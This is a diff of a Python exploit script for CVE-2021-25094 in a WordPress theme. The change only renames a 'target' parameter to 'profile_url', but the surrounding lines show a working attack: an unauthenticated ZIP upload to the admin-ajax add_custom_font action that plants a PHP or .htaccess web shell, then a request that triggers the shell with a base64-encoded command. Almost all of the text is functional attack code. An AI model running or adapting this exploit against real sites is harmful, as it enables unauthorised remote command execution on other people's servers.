@@ -64,16 +64,16 @@ def generate_zip(compression_level=9, technique="php", keep=False):
     return buffer, zipname, shell_filename
 
 
-def upload_zip(target, zip_file, zipname):
+def upload_zip(profile_url, zip_file, zipname):
 
-    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Uploading ZIP archive to {target}/wp-admin/admin-ajax.php?action=add_custom_font")
-    url = f"{target}/wp-admin/admin-ajax.php?action=add_custom_font"
+    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Uploading ZIP archive to {profile_url}/wp-admin/admin-ajax.php?action=add_custom_font")
+    url = f"{profile_url}/wp-admin/admin-ajax.php?action=add_custom_font"
     files = {"file": (f"{zipname}.zip", zip_file.getvalue())}
     
     headers = {
         "X-Requested-With": "XMLHttpRequest",
-        "Origin": target,
-        "Referer": target,
+        "Origin": profile_url,
+        "Referer": profile_url,
         "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
         "Accept": "*/*",
         "Accept-Language": "en-US,en;q=0.9"
@@ -89,9 +89,9 @@ def upload_zip(target, zip_file, zipname):
     return True
 
 
-def trigger_shell(target, zipname, shell_filename, cmd):
+def trigger_shell(profile_url, zipname, shell_filename, cmd):
 
-    shell_url = f"{target}/wp-content/uploads/typehub/custom/{zipname}/{shell_filename}"
+    shell_url = f"{profile_url}/wp-content/uploads/typehub/custom/{zipname}/{shell_filename}"
     encoded_cmd = base64.b64encode(cmd.encode("utf8")).decode("utf8")
     
     print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Triggering shell at {shell_url}")
@@ -106,7 +106,7 @@ def trigger_shell(target, zipname, shell_filename, cmd):
     return True
 
 
-def scan_cve_2021_25094(target):
+def scan_cve_2021_25094(profile_url):
     cmd = 'id'
     techniques = ["php", "htaccess"] 
 
@@ -114,8 +114,8 @@ def scan_cve_2021_25094(target):
         print(f"{Style.BRIGHT}{Fore.CYAN}[•] Attempting exploitation using technique: {technique}")
         zip_file, zipname, shell_filename = generate_zip(technique=technique)
 
-        if upload_zip(target, zip_file, zipname):
-            if trigger_shell(target, zipname, shell_filename, cmd):
+        if upload_zip(profile_url, zip_file, zipname):
+            if trigger_shell(profile_url, zipname, shell_filename, cmd):
                 print(f"{Style.BRIGHT}{Fore.GREEN}[+] Exploitation successful using technique: {technique}")
                 break 
         else:
